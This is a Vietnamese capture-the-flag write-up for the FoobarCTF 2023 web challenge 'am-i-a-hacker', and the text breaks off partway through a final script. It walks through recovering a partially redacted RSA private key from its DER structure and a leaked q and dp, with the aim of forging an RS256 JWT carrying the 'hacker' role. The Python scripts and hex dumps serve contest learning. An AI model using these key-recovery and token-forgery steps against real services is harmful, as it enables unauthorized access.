---
title: "FoobarCTF 2023 - webx2"
excerpt: "This tournament is scheduled to take place from 15:30 (JST) on March 11, 2023, to 15:30 (JST) on March 12, 2023. ‚úÖ  Rating weight: 29,87 üíª Official URL: https://foobar.nitdgplug.org"
header:
show_date: true
classes: wide
header:
  teaser: "https://hackmd.io/_uploads/BJGV07jo6.png"
  teaser_home_page: true
  icon: "https://www.securitynewspaper.com/snews-up/2019/10/Icons_CTF.png"
categories:
  - CTF
tags:
  - CTF
  - Vietnamese
---

<p align="center">
<img src="https://hackmd.io/_uploads/BJGV07jo6.png">
</p>

# am-i-a-hacker (WEB) [First Blood]

## Description
```
Uploading kh√¥ng d·ªÖ ƒë√¢u nha!!!
url: http://34.170.55.8:9999
```

## Solution
Truy c·∫≠p v√†o ƒë∆∞·ªùng d·∫´n m√¨nh nh·∫≠n th·∫•y m·ªôt trang login nh∆∞ sau.

![](https://hackmd.io/_uploads/B1r6ljSsn.png)


s·ª≠ d·ª•ng c√¥ng c·ª• dirsearch ƒë·ªÉ thu th·∫≠p th√¥ng tin trang web:

![](https://hackmd.io/_uploads/rk26xjHjh.png)


m√¨nh th·∫•y ngay file robots.txt c√≥ th·ªÉ truy c·∫≠p 

![](https://hackmd.io/_uploads/Bkg0ljSon.png)


t·∫°i ƒë√¢y ta th·∫•y them 2 path m·ªõi:
> /privkey
> /home/ctf/chall/flag.txt

c√≥ v·∫ª nh∆∞ /home.ctf/chall/flag.txt l√† v·ªã tr√≠ flag tr√™n h·ªá th·ªëng. 
T·ª´ ƒë√¢y m√¨nh ƒëo√°n ·ª©ng d·ª•ng web n√†y c√≥ th·ªÉ ch·ª©a l·ªó h·ªïng nh∆∞ LFI ho·∫∑c XXE, ho·∫∑c ph·∫£i RCE, ....

truy c·∫≠p v√†o /private m√¨nh nh·∫≠n ƒë∆∞·ª£c d·ªØ li·ªáu sau:

```php
-----BEGIN RSA PRIVATE KEY-----
MIIJKQIBAAKCAgEA6KFTFdIRYOkFDi7A7IcJquX3t6+YDbMmM3vs2yzoGSwS5weQ
DIi8Nkqw0dEPcSdcs4ubb6nKs0LhRzZ3bg3A7jFwkTCLnBEEAuXMtP2fWhyEy+kC
L1D9f+DN0lrM5JPByVPc8neQ6Jk7V8xHdwO6rDvNsOfgGgh8uo6gMozxIq4FGqfZ
i4X65hlsa05ODmLRZvHew/GhlrohhTHysiF0rIYn3rsMBUKMnoOP1OAJaTpu2CPN
CLSQrgOWSqlsI2ndJazlJb0T8PDAq9zgO09b5zq+zeooNy1kcrZT2OQkbYkOR6ai
ZvhivlgPtut3+a1AV4sBYg8saTFh9qey3ls7GK4UaPx7csD6LGlsTvQ/OKIxUb4z
[                           Redacted!                          ]
[                           Redacted!                          ]
[                           Redacted!                          ]
[                           Redacted!                          ]
[                           Redacted!                          ]
[                           Redacted!                          ]
[                           Redacted!                          ]
[                           Redacted!                          ]
[                           Redacted!                          ]
[                           Redacted!                          ]
[                           Redacted!                          ]
[                           Redacted!                          ]
[                           Redacted!                          ]
[                           Redacted!                          ]
[                           Redacted!                          ]
[                           Redacted!                          ]
[                           Redacted!                          ]
[                           Redacted!                          ]
[                           Redacted!                          ]
[                           Redacted!                          ]
[                           Redacted!                          ]
7J/HCClz6ECj3QKCAQEA8NZQjp6IgTf45np65WXB6ucW7Z88xhw6OmtNfJYPhgYq
tFu0WIda6+G5KUb44WEmfh9oRTfBk2WpejkywOMP4usvuKtwWK5ywPGqVvsvX9Ug
7GU8DLwjqe6OxbaQQtMRwXDLKTftW9rAjFjdmGWTGr5TJpmahrXzzaE7dT2jW0z2
fX6gnZ3DlgZNwpzCUYu8icnXQjGIgTNSKjBJOu/Bi7sP7PidjIYdqgakUtdhPgbS
obCt1QIkCBQYnSeR/z2kkk7DQ3ESex/sptX4m+gwmgaUwVpwOKnMspAEHwlRCByY
qBW4SFEhiGjiIMxtuZB8+1fNqh8OD5ynNJa82n42wQKCAQEA9BKtggjUF7qvFoQN
otA7V+RAZvi4jKdrtmwKXv2gPynWQgPF3cqAKl9FJvmrTxAt+N1dYfECCYP5PtLM
zyiE4YhXmzDPX9uAErK0jlty7LMVGZvd9IvYnnKhvc4u2y2r53HJ0Mko7Sh5tZJG
eTEVBreMqI2pvaLpaurPkzcV6kaccNsT/OYqf6zma7O8SLaHZZg23dg9QAQAdsRq
V9P3LAamDzDGU3+5UNMdHrU8I20herFJfgJgvjnVlLiqqj3Ih5lXwYO1Sv2z0JLX
vJ0zfb8Ejw4HNcTC8DJWB4AMF9YANBrU/TNTOrpxkOKqtHg8T8B6U/5CmS1cl4HT
Fnw3QQKCAQEAyEzWTudXDHFq1vVCxQsujpmHnjVzrCjJ3NBlb5q2ancyiTJD+eUJ
[                           Redacted!                          ]
[                           Redacted!                          ]
[                           Redacted!                          ]
[                           Redacted!                          ]
[                           Redacted!                          ]
[                           Redacted!                          ]
[                           Redacted!                          ]
[                           Redacted!                          ]
[                           Redacted!                          ]
[                           Redacted!                          ]
-----END RSA PRIVATE KEY-----
```

·ª±a , ƒë√¢y l√† m√£ RSA private key nh∆∞ng b·ªã khu·∫•t m·∫•t v√†i ch·ªó.

C·ª© ƒë·ªÉ t·∫°m ƒë√¢y ƒë√£.

Th·ª≠ khai th√°c ch·ªó login xem, th√¨ m√¨nh nh·∫≠n th·∫•y m·∫∑c d√πng l√† trang login nh∆∞ng nh·∫≠p username,password g√¨ c≈©ng login ƒë∆∞·ª£c.

![](https://hackmd.io/_uploads/rkhAxoHon.png)


Nh∆∞ng web n√≥ ƒëang nh·∫≠n ra m√¨nh. b·∫Øt request ƒë·ªÉ xem th√¨ m√¨nh nh·∫≠n ƒë∆∞·ª£c m·ªôt ƒëo·∫°n token nh∆∞ sau:

![](https://hackmd.io/_uploads/r1G1-sHon.png)


Cookie token:
```
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoicm9va2llIiwiaWF0IjoNjc4NjExMDc3fQ.aMvlbcMsYwKR9AxEtugF1Uz4FUjM0lKJrAYqYIZVMdPvVOryb2ZzcfHIX0ExsdFEMvclzhI4wVppNImTNDNGw7fZElZO1rejEzhjfyuOiUUDfx3XhaA847TBZ5Edhjvqafja90ny0f6k04SYYpj7KFeaWZwQJdBZcREtRvPV3Vd8QiXuqHqLPBd5BYijyMELV8Hbyjq96nvQUrPlhCBgTLiZuZZeltQ8rB13EjX0BzgdbrCMXjdkToVzNj6igHegGJILE4usPdsBorCnkmApsinNCX7P2dsvHzhQUjX2vup4Fc2KTkVK37IXWevQwrGv8MiGuPkO55GsqF25_kOueX7067Mb4j3ZgtO16eioGWpEFszMdAfrddGFwDdZwo2o0RuBqiwenDCUaVAPrrm6BMIMbwLWHbWStJNUNJ7gCDPIbzQHsWnMgCiJ7r4QNFoVhPHxDUn102z8WfShyRBkaYNp0wStRhaAnrJVGDnlmh80Ah4Eb4SFb5RCdoXzij2nC8N40yHZ9RVgpMluuhsqT7PAljmAfdqZ9VZIFQIlhmPvg4450mCaE2OeADmCNPgtrkGtd9s5lM7QwZquuThxHflJclp5c8nINKclOL48GOXSJXMjtL2Ciod48G1hlILSZsy774dzFcSOFmHlJnqfRsDzoSHTmIOM
```

M√¨nh ƒë∆∞a token n√†y v√†o tool sau ƒë·ªÉ gi·∫£i m√£:  `https://jwt.io`

![](https://hackmd.io/_uploads/B1tJZiBjh.png)


ƒê·∫øn ƒë√¢y th√¨ c√≥ th·ªÉ l√Ω gi·∫£i lo do v√¨ sao web nh·∫≠n di·ªán ƒë∆∞·ª£c m√¨nh login v·ªõi t∆∞ c√°ch l√† `rookie`.
M√£ JWT n√†y l√† RS256 v√† c√≥ tr∆∞·ªùng role l√† rookie

trong trang login ta c√≥ th·ªÉ th·∫•y m·ªôt d√≤ng ch·ªØ `Applying for role hacker ?`
ƒêi·ªÅu n√†y cho th·∫•y ta c·∫ßn thay ƒë·ªïi gi√° tr·ªã role trong m√£ jwt th√†nh hacker ƒë·ªÉ c√≥ th·ªÉ truy c·∫≠p ƒë∆∞·ª£c d·ªØ li·ªáu kh√°c trong m√°y t√≠nh.  ƒê·∫øn ƒë√¢y m√¨nh v·∫´n ch∆∞a t√¨m th·∫•y ch·ªó UPload ·ªü ƒë√¢y c·∫£?
kh·∫£ nƒÉng cao ph·∫£i t·∫°o ƒë∆∞·ª£c token m·ªõi , m·ªõi truy c·∫≠p ƒë∆∞·ª£c ch·ª©c nƒÉng upload.

ƒê·∫øn ƒë√¢y m√¨nh c√≥ th·ªÉ x√¢y d·ª±ng √Ω t∆∞·ªüng nh∆∞ sau:
    - Kh√¥i ph·ª•c m√£ RSA private key
    - S·ª≠ d·ª•ng kho√° RSA sau khi ƒë√£ kh√¥i ph·ª•c ƒë·ªÉ c√≥ th·ªÉ ch·ªânh s·ª≠a ƒë∆∞·ª£c tr∆∞·ªùng role th√†nh `hacker`

### 1. Kh√¥i ph·ª•c m√£ RSA private key

Nh√¨n v√†o ph·∫ßn m√£ RSA ·ªü gi·ªØa ta th·∫•y m√£ thi·∫øu 2 ph·∫ßn n·ªØa.

> T√†i li·ªáu tham kh·∫£o cho ph·∫ßn recover PEM c√≥ th·ªÉ xem b√†i vi·∫øt c·ªßa anh Th·∫Øng t·∫°i ƒë√¢y:  https://lilthawg29.wordpress.com/2022/08/03/write-up-crypto-challenge-bro-key-n-uiuctf-2022/

M√¨nh s·∫Ω t√≥m t·∫Øt m·ªôt s·ªë vi·ªác c·∫ßn ch√∫ √Ω nh∆∞ sau:
- ƒë·∫ßu ti√™n, m√£ private key ch√∫ng ta s·∫Ω l√†m vi·ªác v·ªõi ph·∫ßn d·ªØ li·ªáu ·ªü gi·ªØa. 
M√£ RSA ƒë∆∞·ª£c t·∫°o th√†nh g·ªìm n , e , p , q

m√¨nh c√≥ vi·∫øt m·ªôt script t·∫°o PEM nh∆∞ sau:
```python
from Crypto.PublicKey import RSA


e = 65537

p = 1234
q = 545454

N = p*q

key = RSA.construct((N,e, pow(e,-1,(p-1)*(q-1)),p,q))

print(key.export_key().decode())
```

m√¨nh s·∫Ω s·ª≠ d·ª•ng m·ªôt v√≠ d·ª• ƒë·ªÉ h√¨nh dung v·ªÅ PEM nh∆∞ sau.

```bash
-----BEGIN RSA PRIVATE KEY-----
MIICWwIBAAKBgG9qUlakqPE4ryX02g4e1Mf93LDRloxfpkyFwSwMKW609XVIF5ss
ZaV8T7CPZvEaKo53okItd9LiM1wr/hN13DN1FpxM01G0gRelJuPNAigxVAdXga9b
Tm7c/nIbyYsDX+5s+Y/6ynYPS9ewa8JlylaH5wn8u8fywHMZPo5SxnN9AgMBAAEC
gYAuwt8AAmftpi7MrXF/j60aqw+fHrgi/lobr9+djxUso8KJkNJnjEC1LfF8VxOL
icHmvYtaXx71YX7Q5p3iqQrb9cE9vs4EZCHv4CkYQygkIoFwn2ymLnXjIBAESv4M
62DCK20hlr2/9ernR3d+UYrLV59gngGJVyQkkY1NX/sjuQJBAIwkIMZwA8SqzDUm
q87JD01MVlYdjhMah9U6CVrVRFLdZRFQvFmYN9x0OTQVadvjQdXHCrlsHIepRKwd
MTyhj3MCQQDLhpTD6OfMvxUx7q4nNSOWfNHQZ9G7y7kcGhFs7UctxG9L6x7oB3YQ
C1+yYrBjP9fl8KP8Kqb2lu7Jln5gDlVPAkEAi1zeLxhz1t8XJoAneQNfMTqJ3SeV
AxBuJjCJ3weY42MBv/9u3xZN7vCxdkcZN68+6C4BTzXhBVPiU9rP/QCZWwJAcS4l
OpEhnqXAhqUBqgIOCVjeYPPrGXEgPrVsbVPCWnw7nE9jP4sup5t7mzrwdjEBwfhB
aTDa6pRitC4Bly9BVwJAS9qjZ69BxngaWATmqVrFPRGj7P1g3v77ZAjGADL1psqd
NZ8dzDsL07FoqTQI51B/cKknHP/tFUd8uiD+4LtrqQ==
-----END RSA PRIVATE KEY-----
```

ph·∫ßn d·ªØ li·ªáu: 
```bash
MIICWwIBAAKBgG9qUlakqPE4ryX02g4e1Mf93LDRloxfpkyFwSwMKW609XVIF5ss
ZaV8T7CPZvEaKo53okItd9LiM1wr/hN13DN1FpxM01G0gRelJuPNAigxVAdXga9b
Tm7c/nIbyYsDX+5s+Y/6ynYPS9ewa8JlylaH5wn8u8fywHMZPo5SxnN9AgMBAAEC
gYAuwt8AAmftpi7MrXF/j60aqw+fHrgi/lobr9+djxUso8KJkNJnjEC1LfF8VxOL
icHmvYtaXx71YX7Q5p3iqQrb9cE9vs4EZCHv4CkYQygkIoFwn2ymLnXjIBAESv4M
62DCK20hlr2/9ernR3d+UYrLV59gngGJVyQkkY1NX/sjuQJBAIwkIMZwA8SqzDUm
q87JD01MVlYdjhMah9U6CVrVRFLdZRFQvFmYN9x0OTQVadvjQdXHCrlsHIepRKwd
MTyhj3MCQQDLhpTD6OfMvxUx7q4nNSOWfNHQZ9G7y7kcGhFs7UctxG9L6x7oB3YQ
C1+yYrBjP9fl8KP8Kqb2lu7Jln5gDlVPAkEAi1zeLxhz1t8XJoAneQNfMTqJ3SeV
AxBuJjCJ3weY42MBv/9u3xZN7vCxdkcZN68+6C4BTzXhBVPiU9rP/QCZWwJAcS4l
OpEhnqXAhqUBqgIOCVjeYPPrGXEgPrVsbVPCWnw7nE9jP4sup5t7mzrwdjEBwfhB
aTDa6pRitC4Bly9BVwJAS9qjZ69BxngaWATmqVrFPRGj7P1g3v77ZAjGADL1psqd
NZ8dzDsL07FoqTQI51B/cKknHP/tFUd8uiD+4LtrqQ==
```


C·∫•u tr√∫c c·ªßa RSA private key vi·∫øt b·∫±ng ASN.1 s·∫Ω g·ªìm l·∫ßn l∆∞·ª£t t·ª´ tr√™n xu·ªëng: Version, n , e, d, p, q, d mod (p-1), d mod (q-1), (inverse of q) mod p

![](https://hackmd.io/_uploads/rJVgborih.png)


=> ch√∫ng ta s·∫Ω tr√≠ch xu·∫•t gi√° tr·ªã c≈©ng t·ª´ tr√™n xu·ªëng d∆∞·ªõi nh∆∞ v·∫≠y.
V·ªõi m·ªói th√†nh ph·∫ßn tr√™n s·∫Ω bao g·ªìm c√°c tr∆∞·ªùng nh∆∞ sau: byte ƒë·∫ßu ti√™n s·∫Ω l√† Tag, 2 byte th·ª© hai s·∫Ω l√† length, c√°c byte c√≤n l·∫°i v·ªõi t·ªõi Tag ti·∫øp theo s·∫Ω l√† Data c·ªßa tr∆∞·ªùng ƒë√≥.

Vd: 
```bash
30 82 02 5B 02 01 00 02  81 80 6F 6A 52 56 A4 A8
F1 38 AF 25 F4 DA 0E 1E  D4 C7 FD DC B0 D1 96 8C
5F A6 4C 85 C1 2C 0C 29  6E B4 F5 75 48 17 9B 2C
65 A5 7C 4F B0 8F 66 F1  1A 2A 8E 77 A2 42 2D 77
D2 E2 33 5C 2B FE 13 75  DC 33 75 16 9C 4C D3 51
B4 81 17 A5 26 E3 CD 02  28 31 54 07 57 81 AF 5B
4E 6E DC FE 72 1B C9 8B  03 5F EE 6C F9 8F FA CA
76 0F 4B D7 B0 6B C2 65  CA 56 87 E7 09 FC BB C7
F2 C0 73 19 3E 8E 52 C6  73 7D 
```

vd nh∆∞ tr√™n th√¨ 30 l√† Tag c·ªßa Version, 82 02 5B s·∫Ω l√† length c·ªßa SEQUENCE. C√°c th√†nh ph·∫ßn ti·∫øp theo n·∫øu l√† gi√° tr·ªã INTEGER  th√¨ Tag s·∫Ω b·∫Øt ƒë·∫ßu b·∫±ng 02.
M·∫∑c ƒë·ªãnh c√°c th√†nh ph·∫ßn t·∫°o n√™n private key ƒë·∫ßu l√† interger c·∫£ n√™n ta s·∫Ω d·ª±a v√†o Tag 02 n√†y ƒë·ªÉ t√¨m ra d·ªØ li·ªáu c·ªßa c√°c tr∆∞·ªùng c√≤n l·∫°i.

ƒê∆∞·ª£c r·ªìi, ƒë·∫øn ƒë√¢y ta quay tr·ªü l·∫°i v·ªõi m√£ PEM c·ªßa challenge:
tr∆∞·ªõc h·∫øt thay th·∫ø c√°c d√≤ng Redacted b·∫±ng k√Ω t·ª± `___` cho d·ªÖ l√†m vi·ªác.

M√£ PEM l√∫c n√†y tr√¥ng nh∆∞ sau: key_redacted.pem
```bash
-----BEGIN RSA PRIVATE KEY-----
MIIJKQIBAAKCAgEA6KFTFdIRYOkFDi7A7IcJquX3t6+YDbMmM3vs2yzoGSwS5weQ
DIi8Nkqw0dEPcSdcs4ubb6nKs0LhRzZ3bg3A7jFwkTCLnBEEAuXMtP2fWhyEy+kC
L1D9f+DN0lrM5JPByVPc8neQ6Jk7V8xHdwO6rDvNsOfgGgh8uo6gMozxIq4FGqfZ
i4X65hlsa05ODmLRZvHew/GhlrohhTHysiF0rIYn3rsMBUKMnoOP1OAJaTpu2CPN
CLSQrgOWSqlsI2ndJazlJb0T8PDAq9zgO09b5zq+zeooNy1kcrZT2OQkbYkOR6ai
ZvhivlgPtut3+a1AV4sBYg8saTFh9qey3ls7GK4UaPx7csD6LGlsTvQ/OKIxUb4z
________________________________________________________________
________________________________________________________________
________________________________________________________________
________________________________________________________________
________________________________________________________________
________________________________________________________________
________________________________________________________________
________________________________________________________________
________________________________________________________________
________________________________________________________________
________________________________________________________________
________________________________________________________________
________________________________________________________________
________________________________________________________________
________________________________________________________________
________________________________________________________________
________________________________________________________________
________________________________________________________________
________________________________________________________________
________________________________________________________________
________________________________________________________________
7J/HCClz6ECj3QKCAQEA8NZQjp6IgTf45np65WXB6ucW7Z88xhw6OmtNfJYPhgYq
tFu0WIda6+G5KUb44WEmfh9oRTfBk2WpejkywOMP4usvuKtwWK5ywPGqVvsvX9Ug
7GU8DLwjqe6OxbaQQtMRwXDLKTftW9rAjFjdmGWTGr5TJpmahrXzzaE7dT2jW0z2
fX6gnZ3DlgZNwpzCUYu8icnXQjGIgTNSKjBJOu/Bi7sP7PidjIYdqgakUtdhPgbS
obCt1QIkCBQYnSeR/z2kkk7DQ3ESex/sptX4m+gwmgaUwVpwOKnMspAEHwlRCByY
qBW4SFEhiGjiIMxtuZB8+1fNqh8OD5ynNJa82n42wQKCAQEA9BKtggjUF7qvFoQN
otA7V+RAZvi4jKdrtmwKXv2gPynWQgPF3cqAKl9FJvmrTxAt+N1dYfECCYP5PtLM
zyiE4YhXmzDPX9uAErK0jlty7LMVGZvd9IvYnnKhvc4u2y2r53HJ0Mko7Sh5tZJG
eTEVBreMqI2pvaLpaurPkzcV6kaccNsT/OYqf6zma7O8SLaHZZg23dg9QAQAdsRq
V9P3LAamDzDGU3+5UNMdHrU8I20herFJfgJgvjnVlLiqqj3Ih5lXwYO1Sv2z0JLX
vJ0zfb8Ejw4HNcTC8DJWB4AMF9YANBrU/TNTOrpxkOKqtHg8T8B6U/5CmS1cl4HT
Fnw3QQKCAQEAyEzWTudXDHFq1vVCxQsujpmHnjVzrCjJ3NBlb5q2ancyiTJD+eUJ
________________________________________________________________
________________________________________________________________
________________________________________________________________
________________________________________________________________
________________________________________________________________
________________________________________________________________
________________________________________________________________
________________________________________________________________
________________________________________________________________
________________________________________________________________
-----END RSA PRIVATE KEY-----
```

T·∫°i ƒë√¢y c√≥ m·ªôt l∆∞u √Ω: d√≤ng cu·ªëi c√πng c·ªßa m√£ ta ch∆∞a bi·∫øt ƒë∆∞·ª£c ƒë·ªô d√†i ch√≠nh x√°c nh∆∞ng th√¥i c·ª© ƒë·ªÉ l√† c·∫£ d√≤ng ƒëi r·ªìi t√≠nh ti·∫øp.

ƒê·ªÉ x√°c ƒë·ªãnh ƒë∆∞·ª£c c√°c Tag 02 ta c·∫ßn chuy·ªÉn private key sang DER c√°i ƒë√£.

script chuy·ªÉn key_pem sang hex s·∫Ω nh∆∞ sau: thay ƒë·ªïi t√™n file th√†nh file PEM mu·ªën chuy·ªÉn ƒë·ªïi
> key_to_hex.py
```python
from string import ascii_uppercase, ascii_lowercase, digits, hexdigits
import re

# Convert the key from base64 -> bin -> hex to make it easier to read

B64_ALPHABET = ascii_uppercase + ascii_lowercase + digits + "+/"

key_b64 = "".join(open("web_RSA\key_redacted.pem", "r").readlines()[1:-1]).replace("\n", "")
key_bin = "".join(["??????" if i < 0 else bin(i)[2:].zfill(6) for i in map(lambda c: B64_ALPHABET.find(c), key_b64)])
key_hex_blocks = [key_bin[i:i+4] for i in range(0, len(key_bin), 4)]
key_hex = "".join(["?" if "?" in b else hexdigits[int(b, 2)] for b in key_hex_blocks ])

for s in re.findall("\?{2,}", key_hex):
    key_hex = key_hex.replace(s, f"\n[[{len(s)} ?]]\n")

print(key_hex)
```

m√£ hex nh·∫≠n ƒë∆∞·ª£c:

```bash
308209290201000282020100e8a15315d21160e9050e2ec0ec8709aae5f7b7af980db326337becdb2ce8192c12e707900c88bc364ab0d1d10f71275cb38b9b6fa9cab342e14736776e0dc0ee317091308b9c110402e5ccb4fd9f5a1c84cbe9022f50fd7fe0cdd25acce493c1c953dcf27790e8993b57cc477703baac3bcdb0e7e01a087cba8ea0328cf122ae051aa7d98b85fae6196c6b4e4e0e62d166f1dec3f1a196ba218531f2b22174ac8627debb0c05428c9e838fd4e009693a6ed823cd08b490ae03964aa96c2369dd25ace525bd13f0f0c0abdce03b4f5be73abecdea28372d6472b653d8e4246d890e47a6a266f862be580fb6eb77f9ad40578b01620f2c693161f6a7b2de5b3b18ae1468fc7b72c0fa2c696c4ef43f38a23151be33
[[2016 ?]]
ec9fc7082973e840a3dd0282010100f0d6508e9e888137f8e67a7ae565c1eae716ed9f3cc61c3a3a6b4d7c960f86062ab45bb458875aebe1b92946f8e161267e1f684537c19365a97a3932c0e30fe2eb2fb8ab7058ae72c0f1aa56fb2f5fd520ec653c0cbc23a9ee8ec5b69042d311c170cb2937ed5bdac08c58dd9865931abe5326999a86b5f3cda13b753da35b4cf67d7ea09d9dc396064dc29cc2518bbc89c9d74231888133522a30493aefc18bbb0fecf89d8c861daa06a452d7613e06d2a1b0add502240814189d2791ff3da4924ec34371127b1feca6d5f89be8309a0694c15a7038a9ccb290041f0951081c98a815b84851218868e220cc6db9907cfb57cdaa1f0e0f9ca73496bcda7e36c10282010100f412ad8208d417baaf16840da2d03b57e44066f8b88ca76bb66c0a5efda03f29d64203c5ddca802a5f4526f9ab4f102df8dd5d61f1020983f93ed2cccf2884e188579b30cf5fdb8012b2b48e5b72ecb315199bddf48bd89e72a1bdce2edb2dabe771c9d0c928ed2879b5924679311506b78ca88da9bda2e96aeacf933715ea469c70db13fce62a7face66bb3bc48b687659836ddd83d40040076c46a57d3f72c06a60f30c6537fb950d31d1eb53c236d217ab1497e0260be39d594b8aaaa3dc8879957c183b54afdb3d092d7bc9d337dbf048f0e0735c4c2f0325607800c17d600341ad4fd33533aba7190e2aab4783c4fc07a53fe42992d5c9781d3167c37410282010100c84cd64ee7570c716ad6f542c50b2e8e99879e3573ac28c9dcd0656f9ab66a7732893243f9e509
[[960 ?]]
```

code tr√™n t√≠nh to√°n ra ph·∫ßn m√£ b·ªã thi·∫øu th·ª© nh·∫•t c·∫ßn 2016 byte, ph·∫ßn th·ª© hai c·∫ßn 960 byte

V·∫´n c·ª© theo c√°ch ph√¢n t√≠ch nh∆∞ tr√™n m√¨nh ƒë√£ tr√¨nh b√†y th√¨ v·ªõi m√£ n√†y ta c√≥ ƒë∆∞·ª£c c√°c th√¥ng tin sau:

- n·ª≠a ƒë·∫ßu c·ªßa N: 
```bash
00e8a15315d21160e9050e2ec0ec8709aae5f7b7af980db326337becdb2ce8192c12e707900c88bc364ab0d1d10f71275cb38b9b6fa9cab342e14736776e0dc0ee317091308b9c110402e5ccb4fd9f5a1c84cbe9022f50fd7fe0cdd25acce493c1c953dcf27790e8993b57cc477703baac3bcdb0e7e01a087cba8ea0328cf122ae051aa7d98b85fae6196c6b4e4e0e62d166f1dec3f1a196ba218531f2b22174ac8627debb0c05428c9e838fd4e009693a6ed823cd08b490ae03964aa96c2369dd25ace525bd13f0f0c0abdce03b4f5be73abecdea28372d6472b653d8e4246d890e47a6a266f862be580fb6eb77f9ad40578b01620f2c693161f6a7b2de5b3b18ae1468fc7b72c0fa2c696c4ef43f38a23151be33
```

```bash
e = ch∆∞a bi·∫øt nh∆∞ng m√¨nh ƒëo√°n l√† 65537 :)))

n·ª≠a cu·ªëi c·ªßa p = ec9fc7082973e840a3dd

02 82 01 01 length = 0x101
q = 00f0d6508e9e888137f8e67a7ae565c1eae716ed9f3cc61c3a3a6b4d7c960f86062ab45bb458875aebe1b92946f8e161267e1f684537c19365a97a3932c0e30fe2eb2fb8ab7058ae72c0f1aa56fb2f5fd520ec653c0cbc23a9ee8ec5b69042d311c170cb2937ed5bdac08c58dd9865931abe5326999a86b5f3cda13b753da35b4cf67d7ea09d9dc396064dc29cc2518bbc89c9d74231888133522a30493aefc18bbb0fecf89d8c861daa06a452d7613e06d2a1b0add502240814189d2791ff3da4924ec34371127b1feca6d5f89be8309a0694c15a7038a9ccb290041f0951081c98a815b84851218868e220cc6db9907cfb57cdaa1f0e0f9ca73496bcda7e36c1

02 82 01 01 length = 0x101
d mod (p-1) =  
00f412ad8208d417baaf16840da2d03b57e44066f8b88ca76bb66c0a5efda03f29d64203c5ddca802a5f4526f9ab4f102df8dd5d61f1020983f93ed2cccf2884e188579b30cf5fdb8012b2b48e5b72ecb315199bddf48bd89e72a1bdce2edb2dabe771c9d0c928ed2879b5924679311506b78ca88da9bda2e96aeacf933715ea469c70db13fce62a7face66bb3bc48b687659836ddd83d40040076c46a57d3f72c06a60f30c6537fb950d31d1eb53c236d217ab1497e0260be
39d594b8aaaa3dc8879957c183b54afdb3d092d7bc9d337dbf048f0e0735c4c2f0325607800c17d600341ad4fd33533aba7190e2aab4783c4fc07a53fe42992d5c9781d3167c3741

02 82 01 01 length = 0x101
n·ª≠a ƒë·∫ßu c·ªßa d mod (q-1) = 00c84cd64ee7570c716ad6f542c50b2e8e99879e3573ac28c9dcd0656f9ab66a7732893243f9e509
```

t·ª´ c√°c d·ªØ li·ªáu tr√™n m√¨nh t·ªïng k·∫øt l·∫°i:
- c√°c th√†nh ph·∫ßn ƒë√£ ƒë·∫ßy ƒë·ªß g·ªìm: q v√† d mod (p-1), e
- c√°c th√†nh ph·∫ßn khuy·∫øt g·ªìm: N,  p, d mod (q - 1), inver

hmmmmm, m·∫•u ch·ªët v·∫•n ƒë·ªÅ l√† ta c·∫ßn kh√¥i ph·ª•c l·∫°i ƒë∆∞·ª£c m√£ private key n√™n ch·ªâ c·∫ßn t√¨m ƒë∆∞·ª£c p, q , v·ªõi e l√† ƒë·ªß r·ªìi, c√°c th√†nh ph·∫ßn c√°c c√≥ th·ªÉ d√πng c√¥ng th·ª©c t√≠nh ho·∫∑c d√πng script trong file `re_constructkey.py`.

c√≥ m·ªôt c√¥ng th·ª©c ƒë·ªÉ kh√¥i ph·ª•c p m√† ch·ªâ c·∫ßn c√≥ q v√† m·ªôt ph·∫ßn c·ªßa p nh∆∞ sau:

![](https://hackmd.io/_uploads/S18--sSi3.png)


script kh√¥i ph·ª•c p khi ƒë√£ bi·∫øt q v√† dp(d mod (p -1)):
```python
from Crypto.Util.number import isPrime

e = 65537
q = 0xf0d6508e9e888137f8e67a7ae565c1eae716ed9f3cc61c3a3a6b4d7c960f86062ab45bb458875aebe1b92946f8e161267e1f684537c19365a97a3932c0e30fe2eb2fb8ab7058ae72c0f1aa56fb2f5fd520ec653c0cbc23a9ee8ec5b69042d311c170cb2937ed5bdac08c58dd9865931abe5326999a86b5f3cda13b753da35b4cf67d7ea09d9dc396064dc29cc2518bbc89c9d74231888133522a30493aefc18bbb0fecf89d8c861daa06a452d7613e06d2a1b0add502240814189d2791ff3da4924ec34371127b1feca6d5f89be8309a0694c15a7038a9ccb290041f0951081c98a815b84851218868e220cc6db9907cfb57cdaa1f0e0f9ca73496bcda7e36c1
dp = 0xf412ad8208d417baaf16840da2d03b57e44066f8b88ca76bb66c0a5efda03f29d64203c5ddca802a5f4526f9ab4f102df8dd5d61f1020983f93ed2cccf2884e188579b30cf5fdb8012b2b48e5b72ecb315199bddf48bd89e72a1bdce2edb2dabe771c9d0c928ed2879b5924679311506b78ca88da9bda2e96aeacf933715ea469c70db13fce62a7face66bb3bc48b687659836ddd83d40040076c46a57d3f72c06a60f30c6537fb950d31d1eb53c236d217ab1497e0260be39d594b8aaaa3dc8879957c183b54afdb3d092d7bc9d337dbf048f0e0735c4c2f0325607800c17d600341ad4fd33533aba7190e2aab4783c4fc07a53fe42992d5c9781d3167c3741

for kp in range(3, e):
    p_mul = dp * e - 1
    if p_mul % kp == 0:
        p = (p_mul // kp) + 1
        if isPrime(p):
            print(f"Possible p: {p}")
```

ch·∫°y ƒëo·∫°n code tr√™n ta nh·∫≠n ƒë∆∞·ª£c p c√≥ gi√° tr·ªã: 
```bash
Possible p: 31215741529396018812515417004134640787100009229316578288055352664708168865021272656000536899262237216860631014075314842117554610007584785247528295532050275281897604417282764201663808807866131061076109621186637487629104138790759152498808113255780623797965160486898486555778008939394145890311055258828954190178308166849200055982547690198347288279757383042462314793013547724250691979344270237100766694204909177118595054123447170601665312594417746437903137541815770388130579095016109991522854975636849723595280170415639640162352734245874461220998563696559283552786805218843463196427525233172636749571243928543303580034013
```


Tuy·ªát v·ªùi, b√¢y gi·ªù ta ƒë√£ c√≥ ƒë∆∞·ª£c c·∫£ p, q, c√πng v·ªõi e (e m√¨nh ƒëo√°n m√≤ th√¥i!!!!!!!!!!!!)

ch·∫°y file re_constructkey.py ƒë·ªÉ kh√¥i ph·ª•c l·∫°i m√£ private key th√¥i ch·ª© c√≤n ch·ªù chi
```python
from Crypto.PublicKey import RSA

e = 65537

